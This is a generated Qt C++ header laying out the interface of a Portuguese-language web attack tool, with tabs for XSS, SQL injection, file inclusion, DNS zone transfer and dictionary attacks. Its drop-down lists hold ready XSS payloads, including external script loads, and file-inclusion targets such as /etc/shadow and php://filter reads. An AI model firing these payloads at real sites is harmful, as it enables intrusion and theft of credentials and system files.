/********************************************************************************
** Form generated from reading UI file 'mainwindow.ui'
**
** Created by: Qt User Interface Compiler version 5.3.1
**
** WARNING! All changes made in this file will be lost when recompiling UI file!
********************************************************************************/

#ifndef UI_MAINWINDOW_H
#define UI_MAINWINDOW_H

#include <QtCore/QVariant>
#include <QtWebKitWidgets/QWebView>
#include <QtWidgets/QAction>
#include <QtWidgets/QApplication>
#include <QtWidgets/QButtonGroup>
#include <QtWidgets/QCheckBox>
#include <QtWidgets/QComboBox>
#include <QtWidgets/QGroupBox>
#include <QtWidgets/QHeaderView>
#include <QtWidgets/QLabel>
#include <QtWidgets/QLineEdit>
#include <QtWidgets/QMainWindow>
#include <QtWidgets/QMenuBar>
#include <QtWidgets/QProgressBar>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QTabWidget>
#include <QtWidgets/QTableWidget>
#include <QtWidgets/QTextBrowser>
#include <QtWidgets/QTextEdit>
#include <QtWidgets/QWidget>

QT_BEGIN_NAMESPACE

class Ui_MainWindow
{
public:
    QAction *actionSair;
    QAction *actionProxy;
    QAction *actionFuncionalidade;
    QAction *actionAcerca;
    QWidget *centralWidget;
    QTabWidget *tabWidget;
    QWidget *tab;
    QGroupBox *groupBox;
    QLabel *label;
    QLineEdit *lineEdit;
    QPushButton *pushButton;
    QTableWidget *tableWidget;
    QLabel *label_2;
    QTextBrowser *textBrowser;
    QPushButton *pushButton_3;
    QGroupBox *groupBox_2;
    QTextEdit *textEdit_2;
    QLabel *label_8;
    QGroupBox *groupBox_7;
    QTextEdit *textEdit_3;
    QWidget *tab_2;
    QGroupBox *groupBox_3;
    QPushButton *pushButton_2;
    QLineEdit *lineEdit_2;
    QLabel *label_3;
    QLabel *label_4;
    QWebView *webView;
    QComboBox *comboBox;
    QLabel *label_5;
    QWidget *tab_3;
    QGroupBox *groupBox_4;
    QPushButton *pushButton_5;
    QLineEdit *lineEdit_4;
    QLabel *label_9;
    QLabel *label_10;
    QWebView *webView_3;
    QLabel *label_11;
    QComboBox *comboBox_3;
    QLineEdit *lineEdit_5;
    QProgressBar *progressBar;
    QWidget *tab_4;
    QGroupBox *groupBox_5;
    QLabel *label_12;
    QLineEdit *lineEdit_6;
    QLabel *label_13;
    QComboBox *comboBox_2;
    QWebView *webView_2;
    QLabel *label_14;
    QPushButton *pushButton_4;
    QCheckBox *checkBox;
    QGroupBox *groupBox_6;
    QLabel *label_15;
    QLineEdit *lineEdit_7;
    QLabel *label_16;
    QLabel *label_17;
    QPushButton *pushButton_6;
    QLineEdit *lineEdit_3;
    QWebView *webView_4;
    QWidget *tab_5;
    QGroupBox *groupBox_9;
    QPushButton *pushButton_8;
    QLineEdit *lineEdit_9;
    QLabel *label_18;
    QWebView *webView_5;
    QLabel *label_20;
    QComboBox *comboBox_4;
    QLabel *label_19;
    QWidget *tab_7;
    QGroupBox *groupBox_8;
    QLabel *label_6;
    QLineEdit *lineEdit_8;
    QLabel *label_7;
    QPushButton *pushButton_7;
    QTextEdit *textEdit;
    QWidget *tab_9;
    QGroupBox *groupBox_10;
    QLabel *label_21;
    QLineEdit *lineEdit_10;
    QPushButton *pushButton_9;
    QLabel *label_22;
    QLabel *label_23;
    QLineEdit *lineEdit_11;
    QLabel *label_24;
    QComboBox *comboBox_5;
    QPushButton *pushButton_10;
    QTextEdit *textEdit_4;
    QMenuBar *menuBar;

    void setupUi(QMainWindow *MainWindow)
    {
        if (MainWindow->objectName().isEmpty())
            MainWindow->setObjectName(QStringLiteral("MainWindow"));
        MainWindow->resize(738, 478);
        QSizePolicy sizePolicy(QSizePolicy::Fixed, QSizePolicy::Fixed);
        sizePolicy.setHorizontalStretch(0);
        sizePolicy.setVerticalStretch(0);
        sizePolicy.setHeightForWidth(MainWindow->sizePolicy().hasHeightForWidth());
        MainWindow->setSizePolicy(sizePolicy);
        MainWindow->setTabShape(QTabWidget::Rounded);
        actionSair = new QAction(MainWindow);
        actionSair->setObjectName(QStringLiteral("actionSair"));
        actionProxy = new QAction(MainWindow);
        actionProxy->setObjectName(QStringLiteral("actionProxy"));
        actionFuncionalidade = new QAction(MainWindow);
        actionFuncionalidade->setObjectName(QStringLiteral("actionFuncionalidade"));
        actionAcerca = new QAction(MainWindow);
        actionAcerca->setObjectName(QStringLiteral("actionAcerca"));
        centralWidget = new QWidget(MainWindow);
        centralWidget->setObjectName(QStringLiteral("centralWidget"));
        tabWidget = new QTabWidget(centralWidget);
        tabWidget->setObjectName(QStringLiteral("tabWidget"));
        tabWidget->setEnabled(true);
        tabWidget->setGeometry(QRect(0, 0, 741, 461));
        tab = new QWidget();
        tab->setObjectName(QStringLiteral("tab"));
        groupBox = new QGroupBox(tab);
        groupBox->setObjectName(QStringLiteral("groupBox"));
        groupBox->setGeometry(QRect(10, 10, 511, 411));
        label = new QLabel(groupBox);
        label->setObjectName(QStringLiteral("label"));
        label->setGeometry(QRect(10, 30, 61, 16));
        lineEdit = new QLineEdit(groupBox);
        lineEdit->setObjectName(QStringLiteral("lineEdit"));
        lineEdit->setGeometry(QRect(70, 30, 101, 20));
        pushButton = new QPushButton(groupBox);
        pushButton->setObjectName(QStringLiteral("pushButton"));
        pushButton->setGeometry(QRect(200, 20, 301, 41));
        tableWidget = new QTableWidget(groupBox);
        tableWidget->setObjectName(QStringLiteral("tableWidget"));
        tableWidget->setGeometry(QRect(10, 210, 491, 161));
        label_2 = new QLabel(groupBox);
        label_2->setObjectName(QStringLiteral("label_2"));
        label_2->setGeometry(QRect(10, 60, 51, 16));
        textBrowser = new QTextBrowser(groupBox);
        textBrowser->setObjectName(QStringLiteral("textBrowser"));
        textBrowser->setGeometry(QRect(10, 80, 491, 121));
        pushButton_3 = new QPushButton(groupBox);
        pushButton_3->setObjectName(QStringLiteral("pushButton_3"));
        pushButton_3->setGeometry(QRect(390, 379, 111, 21));
        groupBox_2 = new QGroupBox(tab);
        groupBox_2->setObjectName(QStringLiteral("groupBox_2"));
        groupBox_2->setGeometry(QRect(530, 10, 191, 191));
        textEdit_2 = new QTextEdit(groupBox_2);
        textEdit_2->setObjectName(QStringLiteral("textEdit_2"));
        textEdit_2->setGeometry(QRect(10, 20, 171, 151));
        label_8 = new QLabel(groupBox_2);
        label_8->setObjectName(QStringLiteral("label_8"));
        label_8->setGeometry(QRect(10, 170, 171, 20));
        groupBox_7 = new QGroupBox(tab);
        groupBox_7->setObjectName(QStringLiteral("groupBox_7"));
        groupBox_7->setGeometry(QRect(530, 210, 191, 211));
        textEdit_3 = new QTextEdit(groupBox_7);
        textEdit_3->setObjectName(QStringLiteral("textEdit_3"));
        textEdit_3->setGeometry(QRect(10, 20, 171, 181));
        tabWidget->addTab(tab, QString());
        tab_2 = new QWidget();
        tab_2->setObjectName(QStringLiteral("tab_2"));
        groupBox_3 = new QGroupBox(tab_2);
        groupBox_3->setObjectName(QStringLiteral("groupBox_3"));
        groupBox_3->setGeometry(QRect(10, 10, 711, 411));
        pushButton_2 = new QPushButton(groupBox_3);
        pushButton_2->setObjectName(QStringLiteral("pushButton_2"));
        pushButton_2->setGeometry(QRect(510, 20, 191, 61));
        lineEdit_2 = new QLineEdit(groupBox_3);
        lineEdit_2->setObjectName(QStringLiteral("lineEdit_2"));
        lineEdit_2->setGeometry(QRect(40, 30, 461, 20));
        label_3 = new QLabel(groupBox_3);
        label_3->setObjectName(QStringLiteral("label_3"));
        label_3->setGeometry(QRect(10, 33, 31, 16));
        label_4 = new QLabel(groupBox_3);
        label_4->setObjectName(QStringLiteral("label_4"));
        label_4->setGeometry(QRect(10, 60, 46, 13));
        webView = new QWebView(groupBox_3);
        webView->setObjectName(QStringLiteral("webView"));
        webView->setGeometry(QRect(10, 110, 691, 291));
        webView->setUrl(QUrl(QStringLiteral("about:blank")));
        comboBox = new QComboBox(groupBox_3);
        comboBox->setObjectName(QStringLiteral("comboBox"));
        comboBox->setGeometry(QRect(60, 55, 441, 22));
        comboBox->setEditable(true);
        label_5 = new QLabel(groupBox_3);
        label_5->setObjectName(QStringLiteral("label_5"));
        label_5->setGeometry(QRect(10, 90, 51, 16));
        tabWidget->addTab(tab_2, QString());
        tab_3 = new QWidget();
        tab_3->setObjectName(QStringLiteral("tab_3"));
        groupBox_4 = new QGroupBox(tab_3);
        groupBox_4->setObjectName(QStringLiteral("groupBox_4"));
        groupBox_4->setGeometry(QRect(10, 10, 711, 411));
        pushButton_5 = new QPushButton(groupBox_4);
        pushButton_5->setObjectName(QStringLiteral("pushButton_5"));
        pushButton_5->setGeometry(QRect(510, 20, 191, 61));
        pushButton_5->setDefault(false);
        lineEdit_4 = new QLineEdit(groupBox_4);
        lineEdit_4->setObjectName(QStringLiteral("lineEdit_4"));
        lineEdit_4->setGeometry(QRect(40, 30, 461, 20));
        label_9 = new QLabel(groupBox_4);
        label_9->setObjectName(QStringLiteral("label_9"));
        label_9->setGeometry(QRect(10, 33, 31, 16));
        label_10 = new QLabel(groupBox_4);
        label_10->setObjectName(QStringLiteral("label_10"));
        label_10->setGeometry(QRect(10, 60, 41, 16));
        webView_3 = new QWebView(groupBox_4);
        webView_3->setObjectName(QStringLiteral("webView_3"));
        webView_3->setGeometry(QRect(10, 130, 691, 271));
        webView_3->setUrl(QUrl(QStringLiteral("about:blank")));
        label_11 = new QLabel(groupBox_4);
        label_11->setObjectName(QStringLiteral("label_11"));
        label_11->setGeometry(QRect(10, 110, 51, 16));
        comboBox_3 = new QComboBox(groupBox_4);
        comboBox_3->setObjectName(QStringLiteral("comboBox_3"));
        comboBox_3->setGeometry(QRect(53, 57, 71, 20));
        lineEdit_5 = new QLineEdit(groupBox_4);
        lineEdit_5->setObjectName(QStringLiteral("lineEdit_5"));
        lineEdit_5->setGeometry(QRect(130, 57, 371, 20));
        progressBar = new QProgressBar(groupBox_4);
        progressBar->setObjectName(QStringLiteral("progressBar"));
        progressBar->setGeometry(QRect(10, 87, 701, 16));
        progressBar->setValue(24);
        tabWidget->addTab(tab_3, QString());
        tab_4 = new QWidget();
        tab_4->setObjectName(QStringLiteral("tab_4"));
        groupBox_5 = new QGroupBox(tab_4);
        groupBox_5->setObjectName(QStringLiteral("groupBox_5"));
        groupBox_5->setGeometry(QRect(10, 10, 341, 411));
        label_12 = new QLabel(groupBox_5);
        label_12->setObjectName(QStringLiteral("label_12"));
        label_12->setGeometry(QRect(10, 30, 31, 16));
        lineEdit_6 = new QLineEdit(groupBox_5);
        lineEdit_6->setObjectName(QStringLiteral("lineEdit_6"));
        lineEdit_6->setGeometry(QRect(40, 27, 291, 20));
        label_13 = new QLabel(groupBox_5);
        label_13->setObjectName(QStringLiteral("label_13"));
        label_13->setGeometry(QRect(10, 63, 46, 13));
        comboBox_2 = new QComboBox(groupBox_5);
        comboBox_2->setObjectName(QStringLiteral("comboBox_2"));
        comboBox_2->setGeometry(QRect(60, 60, 201, 22));
        comboBox_2->setEditable(true);
        webView_2 = new QWebView(groupBox_5);
        webView_2->setObjectName(QStringLiteral("webView_2"));
        webView_2->setGeometry(QRect(10, 110, 321, 241));
        webView_2->setUrl(QUrl(QStringLiteral("about:blank")));
        label_14 = new QLabel(groupBox_5);
        label_14->setObjectName(QStringLiteral("label_14"));
        label_14->setGeometry(QRect(10, 90, 51, 16));
        pushButton_4 = new QPushButton(groupBox_5);
        pushButton_4->setObjectName(QStringLiteral("pushButton_4"));
        pushButton_4->setGeometry(QRect(10, 360, 321, 41));
        checkBox = new QCheckBox(groupBox_5);
        checkBox->setObjectName(QStringLiteral("checkBox"));
        checkBox->setGeometry(QRect(270, 63, 61, 17));
        groupBox_6 = new QGroupBox(tab_4);
        groupBox_6->setObjectName(QStringLiteral("groupBox_6"));
        groupBox_6->setGeometry(QRect(380, 10, 341, 411));
        label_15 = new QLabel(groupBox_6);
        label_15->setObjectName(QStringLiteral("label_15"));
        label_15->setGeometry(QRect(10, 30, 31, 16));
        lineEdit_7 = new QLineEdit(groupBox_6);
        lineEdit_7->setObjectName(QStringLiteral("lineEdit_7"));
        lineEdit_7->setGeometry(QRect(40, 27, 291, 20));
        label_16 = new QLabel(groupBox_6);
        label_16->setObjectName(QStringLiteral("label_16"));
        label_16->setGeometry(QRect(10, 63, 71, 16));
        label_17 = new QLabel(groupBox_6);
        label_17->setObjectName(QStringLiteral("label_17"));
        label_17->setGeometry(QRect(10, 90, 51, 16));
        pushButton_6 = new QPushButton(groupBox_6);
        pushButton_6->setObjectName(QStringLiteral("pushButton_6"));
        pushButton_6->setGeometry(QRect(10, 360, 321, 41));
        lineEdit_3 = new QLineEdit(groupBox_6);
        lineEdit_3->setObjectName(QStringLiteral("lineEdit_3"));
        lineEdit_3->setGeometry(QRect(80, 60, 241, 20));
        webView_4 = new QWebView(groupBox_6);
        webView_4->setObjectName(QStringLiteral("webView_4"));
        webView_4->setGeometry(QRect(10, 110, 321, 241));
        webView_4->setUrl(QUrl(QStringLiteral("about:blank")));
        tabWidget->addTab(tab_4, QString());
        tab_5 = new QWidget();
        tab_5->setObjectName(QStringLiteral("tab_5"));
        groupBox_9 = new QGroupBox(tab_5);
        groupBox_9->setObjectName(QStringLiteral("groupBox_9"));
        groupBox_9->setGeometry(QRect(10, 10, 711, 411));
        pushButton_8 = new QPushButton(groupBox_9);
        pushButton_8->setObjectName(QStringLiteral("pushButton_8"));
        pushButton_8->setGeometry(QRect(510, 20, 191, 41));
        lineEdit_9 = new QLineEdit(groupBox_9);
        lineEdit_9->setObjectName(QStringLiteral("lineEdit_9"));
        lineEdit_9->setGeometry(QRect(40, 30, 461, 20));
        label_18 = new QLabel(groupBox_9);
        label_18->setObjectName(QStringLiteral("label_18"));
        label_18->setGeometry(QRect(10, 33, 31, 16));
        webView_5 = new QWebView(groupBox_9);
        webView_5->setObjectName(QStringLiteral("webView_5"));
        webView_5->setGeometry(QRect(10, 110, 691, 291));
        webView_5->setUrl(QUrl(QStringLiteral("about:blank")));
        label_20 = new QLabel(groupBox_9);
        label_20->setObjectName(QStringLiteral("label_20"));
        label_20->setGeometry(QRect(10, 90, 51, 16));
        comboBox_4 = new QComboBox(groupBox_9);
        comboBox_4->setObjectName(QStringLiteral("comboBox_4"));
        comboBox_4->setGeometry(QRect(60, 57, 161, 21));
        label_19 = new QLabel(groupBox_9);
        label_19->setObjectName(QStringLiteral("label_19"));
        label_19->setGeometry(QRect(10, 60, 46, 13));
        tabWidget->addTab(tab_5, QString());
        tab_7 = new QWidget();
        tab_7->setObjectName(QStringLiteral("tab_7"));
        groupBox_8 = new QGroupBox(tab_7);
        groupBox_8->setObjectName(QStringLiteral("groupBox_8"));
        groupBox_8->setGeometry(QRect(10, 10, 711, 411));
        label_6 = new QLabel(groupBox_8);
        label_6->setObjectName(QStringLiteral("label_6"));
        label_6->setGeometry(QRect(10, 30, 41, 16));
        lineEdit_8 = new QLineEdit(groupBox_8);
        lineEdit_8->setObjectName(QStringLiteral("lineEdit_8"));
        lineEdit_8->setGeometry(QRect(60, 30, 121, 20));
        label_7 = new QLabel(groupBox_8);
        label_7->setObjectName(QStringLiteral("label_7"));
        label_7->setGeometry(QRect(10, 60, 51, 16));
        pushButton_7 = new QPushButton(groupBox_8);
        pushButton_7->setObjectName(QStringLiteral("pushButton_7"));
        pushButton_7->setGeometry(QRect(200, 20, 501, 41));
        textEdit = new QTextEdit(groupBox_8);
        textEdit->setObjectName(QStringLiteral("textEdit"));
        textEdit->setGeometry(QRect(10, 80, 691, 321));
        tabWidget->addTab(tab_7, QString());
        tab_9 = new QWidget();
        tab_9->setObjectName(QStringLiteral("tab_9"));
        groupBox_10 = new QGroupBox(tab_9);
        groupBox_10->setObjectName(QStringLiteral("groupBox_10"));
        groupBox_10->setGeometry(QRect(10, 10, 711, 411));
        label_21 = new QLabel(groupBox_10);
        label_21->setObjectName(QStringLiteral("label_21"));
        label_21->setGeometry(QRect(10, 30, 51, 16));
        lineEdit_10 = new QLineEdit(groupBox_10);
        lineEdit_10->setObjectName(QStringLiteral("lineEdit_10"));
        lineEdit_10->setGeometry(QRect(70, 30, 101, 20));
        pushButton_9 = new QPushButton(groupBox_10);
        pushButton_9->setObjectName(QStringLiteral("pushButton_9"));
        pushButton_9->setGeometry(QRect(240, 20, 461, 41));
        label_22 = new QLabel(groupBox_10);
        label_22->setObjectName(QStringLiteral("label_22"));
        label_22->setGeometry(QRect(10, 90, 51, 16));
        label_23 = new QLabel(groupBox_10);
        label_23->setObjectName(QStringLiteral("label_23"));
        label_23->setGeometry(QRect(174, 30, 16, 16));
        lineEdit_11 = new QLineEdit(groupBox_10);
        lineEdit_11->setObjectName(QStringLiteral("lineEdit_11"));
        lineEdit_11->setGeometry(QRect(180, 30, 41, 20));
        label_24 = new QLabel(groupBox_10);
        label_24->setObjectName(QStringLiteral("label_24"));
        label_24->setGeometry(QRect(10, 60, 51, 16));
        comboBox_5 = new QComboBox(groupBox_10);
        comboBox_5->setObjectName(QStringLiteral("comboBox_5"));
        comboBox_5->setGeometry(QRect(70, 60, 61, 20));
        pushButton_10 = new QPushButton(groupBox_10);
        pushButton_10->setObjectName(QStringLiteral("pushButton_10"));
        pushButton_10->setEnabled(false);
        pushButton_10->setGeometry(QRect(620, 385, 81, 21));
        textEdit_4 = new QTextEdit(groupBox_10);
        textEdit_4->setObjectName(QStringLiteral("textEdit_4"));
        textEdit_4->setGeometry(QRect(10, 110, 691, 271));
        tabWidget->addTab(tab_9, QString());
        MainWindow->setCentralWidget(centralWidget);
        menuBar = new QMenuBar(MainWindow);
        menuBar->setObjectName(QStringLiteral("menuBar"));
        menuBar->setGeometry(QRect(0, 0, 738, 21));
        MainWindow->setMenuBar(menuBar);

        retranslateUi(MainWindow);

        tabWidget->setCurrentIndex(0);


        QMetaObject::connectSlotsByName(MainWindow);
    } // setupUi

    void retranslateUi(QMainWindow *MainWindow)
    {
        MainWindow->setWindowTitle(QApplication::translate("MainWindow", "vuln", 0));
        actionSair->setText(QApplication::translate("MainWindow", "Sair", 0));
        actionProxy->setText(QApplication::translate("MainWindow", "Proxy", 0));
        actionFuncionalidade->setText(QApplication::translate("MainWindow", "Funcionalidade", 0));
        actionAcerca->setText(QApplication::translate("MainWindow", "Acerca", 0));
        groupBox->setTitle(QApplication::translate("MainWindow", "Scan de Servi\303\247os", 0));
        label->setText(QApplication::translate("MainWindow", "Endere\303\247o:", 0));
        lineEdit->setPlaceholderText(QApplication::translate("MainWindow", "192.168.1.1", 0));
        pushButton->setText(QApplication::translate("MainWindow", "Iniciar", 0));
        label_2->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        pushButton_3->setText(QApplication::translate("MainWindow", "Abrir XML", 0));
        groupBox_2->setTitle(QApplication::translate("MainWindow", "IP Reverso", 0));
        label_8->setText(QString());
        groupBox_7->setTitle(QApplication::translate("MainWindow", "WHOIS", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab), QApplication::translate("MainWindow", "Scan de Servi\303\247os", 0));
        groupBox_3->setTitle(QApplication::translate("MainWindow", "Cross Site Scripting", 0));
        pushButton_2->setText(QApplication::translate("MainWindow", "Testar", 0));
        lineEdit_2->setPlaceholderText(QApplication::translate("MainWindow", "http://www.site.com/search?q=", 0));
        label_3->setText(QApplication::translate("MainWindow", "URL:", 0));
        label_4->setText(QApplication::translate("MainWindow", "Payload:", 0));
        comboBox->clear();
        comboBox->insertItems(0, QStringList()
         << QApplication::translate("MainWindow", "\"'/><script src=\"http://goo.gl/Jbqdvv\"></script>", 0)
         << QApplication::translate("MainWindow", "<--`<img/src=` onerror=alert(\"xssed\")> --!>", 0)
         << QApplication::translate("MainWindow", "\"'%2f><script+src%3d%2f%2fgoo.gl%2Jbqdvv><%2fscript>", 0)
         << QApplication::translate("MainWindow", "<marquee><h1>HTML_INJECTION", 0)
         << QApplication::translate("MainWindow", "<SCRIPT>alert(String.fromCharCode(120, 115, 115, 101, 100))</SCRIPT>", 0)
         << QApplication::translate("MainWindow", "\"'/><BODY ONLOAD=alert('xssed')>", 0)
         << QApplication::translate("MainWindow", "<IMG SRC=javascript:alert('xssed')>", 0)
         << QApplication::translate("MainWindow", "<meta http-equiv=\"refresh\" content=\"0;URL='http://ha.ckers.org/'\" />", 0)
        );
        label_5->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_2), QApplication::translate("MainWindow", "XSS", 0));
        groupBox_4->setTitle(QApplication::translate("MainWindow", "Inje\303\247\303\243o SQL", 0));
        pushButton_5->setText(QApplication::translate("MainWindow", "Testar", 0));
        lineEdit_4->setPlaceholderText(QApplication::translate("MainWindow", "http://www.site.com/noticias.php?id=", 0));
        label_9->setText(QApplication::translate("MainWindow", "URL:", 0));
        label_10->setText(QApplication::translate("MainWindow", "M\303\251todo:", 0));
        label_11->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        comboBox_3->clear();
        comboBox_3->insertItems(0, QStringList()
         << QApplication::translate("MainWindow", "GET", 0)
         << QApplication::translate("MainWindow", "POST", 0)
        );
        lineEdit_5->setPlaceholderText(QApplication::translate("MainWindow", "&id=", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_3), QApplication::translate("MainWindow", "Inje\303\247\303\243o SQL", 0));
        groupBox_5->setTitle(QApplication::translate("MainWindow", "Inclus\303\243o de Ficheiro Local", 0));
        label_12->setText(QApplication::translate("MainWindow", "URL:", 0));
        lineEdit_6->setPlaceholderText(QApplication::translate("MainWindow", "http://www.site.com/index.php?pagina=", 0));
        label_13->setText(QApplication::translate("MainWindow", "Ficheiro:", 0));
        comboBox_2->clear();
        comboBox_2->insertItems(0, QStringList()
         << QApplication::translate("MainWindow", "/etc/passwd", 0)
         << QApplication::translate("MainWindow", "/etc/shadow", 0)
         << QApplication::translate("MainWindow", "/proc/self/environ", 0)
         << QApplication::translate("MainWindow", "/etc/release", 0)
         << QApplication::translate("MainWindow", "/var/www/logs/access_log", 0)
         << QApplication::translate("MainWindow", "/usr/local/apache/logs", 0)
         << QApplication::translate("MainWindow", "C:\\apache\\logs\\access.log", 0)
         << QApplication::translate("MainWindow", "C:\\xampp\\apache\\logs\\access.log", 0)
         << QApplication::translate("MainWindow", "C:\\windows\\win.ini", 0)
         << QApplication::translate("MainWindow", "php://input", 0)
         << QApplication::translate("MainWindow", "php://filter/convert.base64-encode/resource=db.php", 0)
         << QApplication::translate("MainWindow", "data://text/plain;base64,SSBsb3ZlIFBIUAo=", 0)
        );
        label_14->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        pushButton_4->setText(QApplication::translate("MainWindow", "Testar", 0));
        checkBox->setText(QApplication::translate("MainWindow", "Nullbyte", 0));
        groupBox_6->setTitle(QApplication::translate("MainWindow", "Inclus\303\243o de Ficheiro Remoto", 0));
        label_15->setText(QApplication::translate("MainWindow", "URL:", 0));
        lineEdit_7->setPlaceholderText(QApplication::translate("MainWindow", "http://www.site.com/index.php?pagina=", 0));
        label_16->setText(QApplication::translate("MainWindow", "PHP Payload:", 0));
        label_17->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        pushButton_6->setText(QApplication::translate("MainWindow", "Testar", 0));
        lineEdit_3->setText(QString());
        lineEdit_3->setPlaceholderText(QApplication::translate("MainWindow", "phpinfo();", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_4), QApplication::translate("MainWindow", "Inclus\303\243o de Ficheiros", 0));
        groupBox_9->setTitle(QApplication::translate("MainWindow", "Revela\303\247\303\243o de Diret\303\263rio Completo", 0));
        pushButton_8->setText(QApplication::translate("MainWindow", "Testar", 0));
        lineEdit_9->setPlaceholderText(QApplication::translate("MainWindow", "http://www.site.com/index?pagina=", 0));
        label_18->setText(QApplication::translate("MainWindow", "URL:", 0));
        label_20->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        comboBox_4->clear();
        comboBox_4->insertItems(0, QStringList()
         << QApplication::translate("MainWindow", "Array nulo", 0)
         << QApplication::translate("MainWindow", "Sess\303\243o nula", 0)
         << QApplication::translate("MainWindow", "Sess\303\243o inv\303\241lida", 0)
         << QApplication::translate("MainWindow", "Sess\303\243o inv\303\241lida (129 bytes)", 0)
        );
        label_19->setText(QApplication::translate("MainWindow", "Payload:", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_5), QApplication::translate("MainWindow", "Revela\303\247\303\243o de Dir.", 0));
        groupBox_8->setTitle(QApplication::translate("MainWindow", "Transfer\303\252ncia de Zona DNS", 0));
        label_6->setText(QApplication::translate("MainWindow", "Dom\303\255nio:", 0));
        lineEdit_8->setText(QString());
        lineEdit_8->setPlaceholderText(QApplication::translate("MainWindow", "site.com", 0));
        label_7->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        pushButton_7->setText(QApplication::translate("MainWindow", "Testar", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_7), QApplication::translate("MainWindow", "Transf. Zona DNS", 0));
        groupBox_10->setTitle(QApplication::translate("MainWindow", "Ataque com Dicion\303\241rio", 0));
        label_21->setText(QApplication::translate("MainWindow", "Endere\303\247o:", 0));
        lineEdit_10->setPlaceholderText(QApplication::translate("MainWindow", "192.168.1.1", 0));
        pushButton_9->setText(QApplication::translate("MainWindow", "Iniciar", 0));
        label_22->setText(QApplication::translate("MainWindow", "Sa\303\255da:", 0));
        label_23->setText(QApplication::translate("MainWindow", ":", 0));
        lineEdit_11->setText(QApplication::translate("MainWindow", "21", 0));
        lineEdit_11->setPlaceholderText(QString());
        label_24->setText(QApplication::translate("MainWindow", "Protocolo:", 0));
        comboBox_5->clear();
        comboBox_5->insertItems(0, QStringList()
         << QApplication::translate("MainWindow", "ftp", 0)
         << QApplication::translate("MainWindow", "ssh", 0)
         << QApplication::translate("MainWindow", "telnet", 0)
         << QApplication::translate("MainWindow", "http", 0)
         << QApplication::translate("MainWindow", "smb", 0)
         << QApplication::translate("MainWindow", "rdp", 0)
         << QApplication::translate("MainWindow", "vnc", 0)
         << QApplication::translate("MainWindow", "pop3", 0)
        );
        pushButton_10->setText(QApplication::translate("MainWindow", "Guardar", 0));
        tabWidget->setTabText(tabWidget->indexOf(tab_9), QApplication::translate("MainWindow", "Ataque Dicion\303\241rio", 0));
    } // retranslateUi

};

namespace Ui {
    class MainWindow: public Ui_MainWindow {};
} // namespace Ui

QT_END_NAMESPACE

#endif // UI_MAINWINDOW_H
